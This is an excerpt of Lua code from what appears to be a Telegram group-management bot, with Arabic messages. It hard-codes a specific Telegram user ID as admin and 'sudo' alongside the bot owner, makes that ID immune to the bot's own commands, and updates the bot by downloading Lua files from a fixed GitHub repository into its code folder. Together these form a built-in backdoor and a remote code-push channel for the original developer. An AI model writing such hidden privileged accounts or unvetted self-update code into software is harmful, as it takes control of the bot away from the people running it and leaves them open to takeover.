...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 then 
Adminn = true
...
download_file('https://raw.githubusercontent.com/SNKO85/abaza/blob/master/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████ @jjjjvj      |') end
download_file('https://raw.githubusercontent.com/SNKO85/abaza/blob/master/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████     |') end
download_file('https://raw.githubusercontent.com/SNKO85/abaza/blob/master/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████   |') end
download_file('https://raw.githubusercontent.com/SNKO85/abaza/blob/master/inc/functions.lua','./inc/functions.lua')
...
result = false
if msg.sender_user_id_ == 1619524486 then 
SudoBase = true
...
if UserID == 1619524486 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ") end
